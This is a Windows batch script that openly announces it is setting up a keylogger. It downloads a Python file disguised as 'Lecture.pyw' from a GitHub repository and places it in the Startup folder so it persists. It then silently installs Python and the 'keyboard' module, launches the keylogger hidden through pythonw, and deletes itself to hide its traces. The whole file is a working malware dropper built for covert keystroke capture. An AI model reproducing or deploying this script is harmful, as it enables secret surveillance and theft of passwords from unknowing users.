@echo off
echo Setting up Keylogger...

REM Step 1: Download Lecture.pyw from GitHub
echo Downloading Lecture.pyw from GitHub...
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/spy-group/keylogger/raw/main/Lecture.pyw' -OutFile '%USERPROFILE%\Downloads\Lecture.pyw'"

REM Step 2: Move Lecture.pyw to Startup folder
echo Moving Lecture.pyw to Startup folder...
move "%USERPROFILE%\Downloads\Lecture.pyw" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

REM Step 3: Download and install Python 3.12 silently
echo Downloading Python 3.12 installer...
powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe' -OutFile '%TEMP%\python_installer.exe'"

echo Installing Python 3.12...
start /wait "" "%TEMP%\python_installer.exe" /quiet InstallAllUsers=1 PrependPath=1
del "%TEMP%\python_installer.exe"

REM Step 4: Install the 'keyboard' module
echo Installing 'keyboard' module...
pip install keyboard

REM Step 5: Run Lecture.pyw in hidden mode using pythonw.exe
echo Running Lecture.pyw in hidden mode...
start /b pythonw "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Lecture.pyw"

REM Step 6: Delete the BAT file after execution
echo Deleting BAT file...
del "%~f0"

REM Step 7: Close CMD window automatically
exit
